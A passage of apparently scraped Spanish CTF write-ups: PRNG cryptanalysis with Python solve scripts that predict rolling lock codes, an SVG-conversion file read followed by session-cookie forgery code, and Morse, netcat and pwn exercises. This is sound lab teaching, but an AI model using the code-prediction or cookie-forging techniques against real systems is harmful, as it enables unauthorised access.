\\color{red}{1} 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 \\color{red}{1} 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 \\color{red}{1} \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} \\newline 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\newline 0 0 \\color{red}{1} \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\newline 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} \\newline 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\end{pmatrix} $$\nNótese que estamos operando en el Cuerpo Finito de Galois de dimensión 2 (solamente tenemos 0 y 1). Por tanto, la suma es lo mismo que la operación XOR, y el producto es equivalente a la operación AND.\nVamos a recordar cómo se calcula ret (el código evolutivo que necesitamos para obtener la flag):\nret = 0 for _ in range(26): ret \u0026lt;\u0026lt;= 1 ret |= state \u0026amp; 1 # Changes in state  Está formado por el bit menos significativo de state en cada iteración. Por tanto, necesitamos la última fila de las matrices $I, A, A^2, A^3, \\dots, A^{24}, A^{25}$, que están relacionadas con el último bit del state actual de cada iteración.\nLa idea es resolver un sistema de ecuaciones de manera que podamos obtener el state actual. Con un código evolutivo, tenemos 26 ecuaciones (ya que el código tiene 26 bits). Aunque state tiene 64 bits, hemos demostrado que por cada cuatro bits, hay dos que tienen el mismo valor (de aquí se sacan 16 ecuaciones). Por tanto, tenemos 48 incógnitas. Luego, para resolver el sistema para un state completo, necesitamos dos códigos evolutivos. Habrá que concatenar estos dos códigos evolutivos y calcular la última fila de las matrices $A^0$ hasta $A^{47}$.\nEstas serán algunas de las ecuaciones del sistema que necesitamos resolver (donde $s$ es el state y $r$ y $t$ son los dos códigos evolutivos ret):\n$$ \\begin{cases} s_{63} + s_{60} \u0026amp; = \u0026amp; 0 \\newline s_{59} + s_{56} \u0026amp; = \u0026amp; 0 \\newline \\dots \u0026amp; = \u0026amp; 0 \\newline s_3 + s_0 \u0026amp; = \u0026amp; 0 \\newline s_0 \u0026amp; = \u0026amp; r_{25} \\newline s_{61} + s_2 \u0026amp; = \u0026amp; r_{24} \\newline \\dots \u0026amp; = \u0026amp; \\dots \\newline \\dots \u0026amp; = \u0026amp; r_0 \\newline \\dots \u0026amp; = \u0026amp; t_{25} \\newline \\dots \u0026amp; = \u0026amp; \\dots \\newline \\dots \u0026amp; = \u0026amp; t_5 \\newline \\dots \u0026amp; = \u0026amp; t_4 \\newline \\end{cases} $$\nEste sistema de ecuaciones puede ser expresado en forma matricial como se muestra a continuación:\n$$ M \\cdot \\begin{pmatrix} s_{63} \\newline \\dots \\newline s_0 \\end{pmatrix} = \\begin{pmatrix} 0 \\newline \\overset{(16)}{\\dots} \\newline 0 \\newline r_{25} \\newline \\dots \\newline r_0 \\newline t_{25} \\newline \\dots \\newline t_5 \\newline t_4 \\end{pmatrix} $$\nDonde las filas de $M$ son las 16 primeras ecuaciones en forma matricial y la última fila de las matrices $I, A, A^2, A^3, \\dots, A^{47}$.\nPara resolver el sistema de ecuaciones, podemos utilizar eliminación Gaussiana sobre el Cuerpo Finito de Galois de dimensión 2 ($\\mathbb{F}_2$):\ndef gauss_elim(x_mat, b_mat): aug_mat = add_column(x_mat, b_mat) for j in range(len(x_mat)): for i in range(j + 1, len(x_mat)): if aug_mat[i][j]: aug_mat[i], aug_mat[j] = aug_mat[j].copy(), aug_mat[i].copy() break for i in range(j + 1, len(x_mat)): if aug_mat[i][j]: aug_mat[i] = [a ^ b for a, b in zip(aug_mat[i], aug_mat[j])] for j in range(len(x_mat) - 1, 0, -1): for i in range(j - 1, -1, -1): if aug_mat[i][j]: aug_mat[i] = [a ^ b for a, b in zip(aug_mat[i], aug_mat[j])] return [r[-1] for r in aug_mat]  El algoritmo de elminación Gaussiana es bastante conocido, por lo que no cabe explicación (lo único que hay que tener en cuenta es que estamos en $\\mathbb{F}_2$). Otra manera de resolver el sistema es calculando la inversa de $M$ en $\\mathbb{F}_2$, que se puede realizar con SageMath.\nDe todas maneras, desarrollé un script en Python para resolver esta parte del reto automáticamente:\nimport re import requests import sys # Functions and global variables url = sys.argv[1] def get_code(): r = requests.post(f'{url}/unlock', {'code': 1}) return int(re.findall(r'(\\d+)', r.text)[0]) def main(): global state code1 = get_code() code2 = get_code() codes = ('0' * 16 + f'{code1:026b}' + f'{code2:026b}')[:64] codes_vector = list(map(int, list(codes))) comp_state = gauss_elim(ret_mat, codes_vector) state = int(''.join(map(str, comp_state)), 2) next(26) next(26) code3 = next(26) r = requests.post(f'{url}/unlock', {'code': code3}) print(r.text) if __name__ == '__main__': main()  Estas funciones toman dos códigos evolutivos del mensaje de error que aparece en la página web y se utilizan para calcular el estado (comp_state), y después calcular el tercer código evolutivo para intentar desbloquear la página y obtener la flag.\nLa variable ret_mat es la matriz $M$, que se calcula como sigue:\nstate_mat_initial = [...] ret_mat = [] for i in range(16): ret_mat.append(list(map(int, list(f'{9 \u0026lt;\u0026lt; (4 * i):064b}')))) state_mat = [[int(i == j) for j in range(64)] for i in range(64)] for _ in range(48): ret_mat.append(state_mat[-1]) state_mat = multiply_matrix(state_mat, state_mat_initial)  Donde state_mat_initial es la matriz $A$ mejorada.\nTambién hay funciones para realizar operaciones en $\\mathbb{F}_2$. De nuevo, los algoritmos son bastante conocidos:\ndef multiply_vector(x_mat, y_vector): z_vector = [0 for _ in range(len(x_mat))] for i in range(len(x_mat)): for k in range(len(y_vector)): z_vector[i] ^= x_mat[i][k] \u0026amp; y_vector[k] return z_vector def multiply_matrix(x_mat, y_mat): if type(y_mat[0]) == int: return multiply_vector(x_mat, y_mat) z_mat = [[0 for _ in range(len(y_mat[0]))] for _ in range(len(x_mat))] for i in range(len(x_mat)): for j in range(len(y_mat[i])): for k in range(len(y_mat)): z_mat[i][j] ^= x_mat[i][k] \u0026amp; y_mat[k][j] return z_mat def add_column(x_mat, y_vector): z_mat = x_mat.copy() for i in range(len(y_vector)): z_mat[i].append(y_vector[i]) return z_mat  Finalmente, si ejecutamos el script, obtenemos la segunda flag:\n$ python3 solve.py http://35.190.155.168/c33a5d03b6 Unlocked successfully. Flag: ^FLAG^xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx$FLAG$  ","image":"/images/web-cryptography.png","permalink":"https://7rocky.github.io/ctf/hacker101ctf/model-e1337-rolling-code-lock/","section":"ctf","summary":"Explotación web y criptoanálisis avanzado. XXE. Ingeniería inversa","time":44,"title":"Model E1337 - Rolling Code Lock"},{"contents":"Este reto está muy relacionado a Model E1337 - Rolling Code Lock, especialmente en la parte de criptoanálisis. Se recomienda leerlo si no se ha hecho antes.\nComo en el reto anterior, tenemos una simple página web que solicita un código para desbloquear:\nPodemos poner cualquier número y veremos que es incorrecto:\nLa diferencia con el primer reto es la longitud del número, esta vez es de 64 bits.\nDeberíamos de tener el código fuente en Python para realizar el proceso de criptoanálisis. Si recordamos, había un script llamado rng.py (de Random Number Generator) en el reto anterior. Podemos intentar acceder a él desde el servidor web, y aquí lo tenemos:\n$ curl http://35.190.155.168/5eaafdba5d/rng  import random def setup(seed): global state state = 0 for i in range(16): cur = seed \u0026amp; 3 seed \u0026gt;\u0026gt;= 2 state = (state \u0026lt;\u0026lt; 4) | ((state \u0026amp; 3) ^ cur) state |= cur \u0026lt;\u0026lt; 2 def next(bits): global state ret = 0 for _ in range(bits): ret \u0026lt;\u0026lt;= 1 ret |= state \u0026amp; 1 for _ in range(3): state = (state \u0026lt;\u0026lt; 1) ^ (state \u0026gt;\u0026gt; 61) state \u0026amp;= 0xFFFFFFFFFFFFFFFF state ^= 0xFFFFFFFFFFFFFFFF for j in range(0, 64, 4): cur = (state \u0026gt;\u0026gt; j) \u0026amp; 0xF cur = (cur \u0026gt;\u0026gt; 3) | ((cur \u0026gt;\u0026gt; 2) \u0026amp; 2) | ((cur \u0026lt;\u0026lt; 3) \u0026amp; 8) | ((cur \u0026lt;\u0026lt; 2) \u0026amp; 4) state ^= cur \u0026lt;\u0026lt; j return ret setup((random.randrange(0x10000) \u0026lt;\u0026lt; 48) | (random.randrange(0x10000) \u0026lt;\u0026lt; 32) | (random.randrange(0x10000) \u0026lt;\u0026lt; 16) | random.randrange(0x10000))  Es extremadamente similar al del primer reto. Las diferencias son:\n La semilla seed es de 64 bits El cálculo del state para cada iteración de next se realiza tres veces Hay 64 iteraciones en next, ya que ret es un número de 64 bits  La resolución del reto sigue el mismo procedimiento que el reto anterior. Necesitamos obtener todos los state utilizando la matriz $A$ y tomar la última fila (que será el bit menos significativo de state, que será añadido a ret):\nret = 0 for _ in range(64): ret \u0026lt;\u0026lt;= 1 ret |= state \u0026amp; 1 for _ in range(3): # Changes in state  Esta vez, necesitamos $I$, $A^3$, $A^6$ hasta $A^{141}$ (que es $\\left(A^{47}\\right)^3$).\nPara este reto, solamente necesitamos un código incorrecto (de hecho, solamente los 48 bits más significativos). Necesitamos resolver un sistema de ecuaciones similar, como este:\n$$ \\begin{cases} s_{63} + s_{60} \u0026amp; = \u0026amp; 0 \\newline s_{59} + s_{56} \u0026amp; = \u0026amp; 0 \\newline \\dots \u0026amp; = \u0026amp; 0 \\newline s_3 + s_0 \u0026amp; = \u0026amp; 0 \\newline s_0 \u0026amp; = \u0026amp; r_{63} \\newline \\dots \u0026amp; = \u0026amp; r_{62} \\newline \\dots \u0026amp; = \u0026amp; \\dots \\newline \\dots \u0026amp; = \u0026amp; r_{16} \\newline \\end{cases} $$\nDonde $s$ es el state que necesitamos y $r$ es el código mostrado en el mensaje de error (ret). Las primeras 16 ecuaciones son iguales a las del reto anterior: para cada cuarteto, el primer y el último bit son el mismo. Las siguientes 48 ecuaciones contienen la última fila de las matrices $I$, $A^3$, $A^6$ hasta $A^{141}$ en forma algebraica.\nPara resolver el sistema, empleamos de nuevo Eliminación Gaussiana sobre el Cuerpo Finito de Galois de dimensión 2 (las sumas son operaciones XOR y los productos son operaciones AND), o $\\mathbb{F}_2$.\nUtilicé un script de Python para resolver este reto. Es realmente similar al mostrado y explicado anteriormente. La matriz $A$ es la misma (la mejorada), pero la matriz $M$ es ligeramente diferente debido a que state se calcula tres veces en cada iteración de next:\nstate_mat_initial = [...] ret_mat = [] for i in range(16): ret_mat.append(list(map(int, list(f'{9 \u0026lt;\u0026lt; (4 * i):064b}')))) state_mat = [[int(i == j) for j in range(64)] for i in range(64)] for _ in range(48): ret_mat.append(state_mat[-1]) state_mat = multiply_matrix(state_mat, state_mat_initial) state_mat = multiply_matrix(state_mat, state_mat_initial) state_mat = multiply_matrix(state_mat, state_mat_initial)  Y en la función main solamente se toma un código, ya que es suficiente información para extraer el state:\ndef main(): global state code1 = get_code() codes = ('0' * 16 + f'{code1:064b}')[:64] codes_vector = list(map(int, list(codes))) comp_state = gauss_elim(ret_mat, codes_vector) state = int(''.join(map(str, comp_state)), 2) next(64) code2 = next(64) r = requests.post(f'{url}/unlock', {'code': code2}) print(r.text)  Cabe mencionar las llamadas a next(64), porque ahora ret es de 64 bits.\nFinalmente, si ejecutamos el script, obtenemos la flag:\n$ python3 solve.py http://35.190.155.168/5eaafdba5d Unlocked successfully. Flag: ^FLAG^xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx$FLAG$  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/ctf/hacker101ctf/model-e1337-v2-hardened-rolling-code-lock/","section":"ctf","summary":"Criptoanálisis avanzado. Ingeniería inversa","time":3,"title":"Model E1337 v2 - Hardened Rolling Code Lock"},{"contents":"Se nos proporciona esta ristra de . y -:\n-.-. - ..-. .-.. . .- .-. -. ... .- -- ..- . .-.. -- --- .-. ... . .. ... -.-. --- --- .-.. -... -.-- - .... . .-- .- -.-- .. .-.. .. -.- . -.-. .... . . ...  Como sugiere el título del reto, se trata de código Morse. Por tanto, tenemos que decodificarlo.\nEsto lo podemos hacer manualmente: -.-. es C, - es T, ..-. es F\u0026hellip; O podemos utilizar un decodificador como morsedecoder.com:\nY obtenemos este mensaje: CTFLEARNSAMUELMORSEISCOOLBYTHEWAYILIKECHEES. Entonces, la flag es: CTFlearn{SAMUELMORSEISCOOLBYTHEWAYILIKECHEES}.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/ctf/ctflearn/cryptography/morse-code/","section":"ctf","summary":"Decodificación de código Morse","time":0,"title":"Morse Code"},{"contents":"Se nos proporciona una página web como esta:\nNos tenemos que registrar e iniciar sesión para ver un dashboard chulo:\nLa única funcionalidad que tenemos es la de exportar las imágenes SVG que vemos como archivos PNG. Podemos capturar la petición con Burp Suite:\nDespués de un poco de investigación, podemos ver que hay una vulnerabilidad en la conversión de SVG que deriva en lectura de archivos locales (más información en security.snyk.io).\nNecesitaremos usar el siguiente payload para leer /etc/passwd como imagen PNG:\nY aquí lo tenemos:\nAhora podemos comenzar a leer código fuente. Por ejemplo, podemos comenzar con /app/index.js:\nAquí vemos que utiliza /app/.env como archivo de configuración para cargar SESSION_SECRET_KEY:\nSi leemos /app/routes/index.js, vemos que si somos admin, podremos leer la flag (en /dashboard):\nAhora lo que tenemos que hacer es falsificar dos cookies de sesión utilizando el mismo código de arriba y el mismo valor de SESSION_SECRET_KEY:\n#!/usr/bin/env node const express = require('express') const session = require('cookie-session') const cookieParser = require('cookie-parser') const app = express() app.use(express.json({ limit: '2mb' })) app.use(cookieParser()) app.use(session({ name: 'session', keys: ['5921719c3037662e94250307ec5ed1db'] })) app.get('/', (req, res) =\u0026gt; { req.session.username = 'admin' res.send({ message: req.session.username }) }) app.listen(3000, () =\u0026gt; console.log('Listening...'))  Si arrancamos el servidor, podemos obtener las cookies de sesión y configurarlas en el navegador:\n$ node index.js Listening...  $ curl 127.0.0.1:3000 -si | grep Cookie Set-Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0=; path=/; httponly Set-Cookie: session.sig=EYdvy2mhVoEznETyhYjNYFFZM8o; path=/; httponly  Al refrescar la página, vemos otra imagen que muestra la flag (HTB{fr4m3d_s3cr37s_4nd_f0rg3d_entr13s}):\n","image":"/images/web.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/web/mutation-lab/","section":"ctf","summary":"Lectura de archivos mediante imágenes SVG. Falsificación de cookies de sesión","time":1,"title":"Mutation Lab"},{"contents":"Se nos proporciona un nombre de dominio y un puerto para una instancia remota. Si nos conectamos utilizando nc, nos envía una lista de números:\n$ nc mercury.picoctf.net 22902 112 105 99 111 67 84 70 123 103 48 48 100 95 107 49 116 116 121 33 95 110 49 99 51 95 107 49 116 116 121 33 95 100 51 100 102 100 54 100 102 125 10 ^C  Estos números parece que son la representación en ASCII decimal de algunos caracteres.\nPor ejemplo, 112 es p, 105 es i, 99 es c and 111 es o. Por tanto, los números son la flag en ASCII.\nPara decodificar la flag, podemos utilizar un poco de shell scripting y Python. Como nc está manteniendo la conexión abierta, podemos cerrarla con timeout.\n$ timeout 1 nc mercury.picoctf.net 22902 | xargs 112 105 99 111 67 84 70 123 103 48 48 100 95 107 49 116 116 121 33 95 110 49 99 51 95 107 49 116 116 121 33 95 100 51 100 102 100 54 100 102 125 10 $ python3 -c \"print('$(timeout 1 nc mercury.picoctf.net 22902 | xargs)')\" 112 105 99 111 67 84 70 123 103 48 48 100 95 107 49 116 116 121 33 95 110 49 99 51 95 107 49 116 116 121 33 95 100 51 100 102 100 54 100 102 125 10 $ python3 -c \"print(''.join(map(chr, map(int, '$(timeout 1 nc mercury.picoctf.net 22902 | xargs)'.split()))))\" picoCTF{g00d_k1tty!_n1c3_k1tty!_d3dfd6df}  La flag también se puede decodificar utilizando un script en Python con pwntools:\nfrom pwn import context, remote context.log_level = 'CRITICAL' r = remote('mercury.picoctf.net', 22902) flag = [] while (c := r.recvline().strip()) != b'10': flag.append(chr(int(c.decode()))) r.close() print(''.join(flag))  $ python3 solve.py picoCTF{g00d_k1tty!_n1c3_k1tty!_d3dfd6df}  ","image":"/images/misc.png","permalink":"https://7rocky.github.io/ctf/picoctf/general-skills/nice-netcat.../","section":"ctf","summary":"picoCTF 2021. 15 puntos. Conexión a una instancia remota. Decodificación en ASCII","time":1,"title":"Nice netcat..."},{"contents":"Se nos proporciona un binario de 64 bits llamado notepad:\nArch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000)  Si usamos Ghidra para extraer el código en C descompilado, veremos la función main:\nvoidmain() { setbuf(stdout, (char*) 0x0); do{ notepad(); } while(true); }  Básicamente, ejecuta notepad de forma infinita:\nvoidnotepad() { longin_FS_OFFSET; charoption; inti; undefined notes[136]; longcanary; canary =*(long*) (in_FS_OFFSET +0x28); for(i =0; i \u0026lt;128; i =i +1) { notes[i] =0; } puts(\"Welcome to Notepad as a Service!\"); while(true) { while(true) { while(true) { puts(\"Menu:\"); puts(\"1) View note\"); puts(\"2) Edit note\"); puts(\"3) Quit and make new note\\n\"); printf(\"\u0026gt;\u0026gt;\u0026gt; \"); __isoc99_scanf(\"%c%c\", \u0026amp;option, \u0026amp;dead); if(option !='1') break; view(notes); } if(option !='2') break; edit(notes); } if(option =='3') break; puts(\"Not a valid choice!\"); } if(canary !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return; }  La función view es bastante sencilla:\nvoidview(undefined8 param_1) { printf(\"Your note is %s\\n\", param_1); return; }  Y la función edit es muy interesante:\nvoidedit(longparam_1) { intinput_char; inti; intlimit;  puts(\"What index do you want to edit it at (0-127)?\"); printf(\"\u0026gt;\u0026gt;\u0026gt; \"); __isoc99_scanf(\"%u%c\", 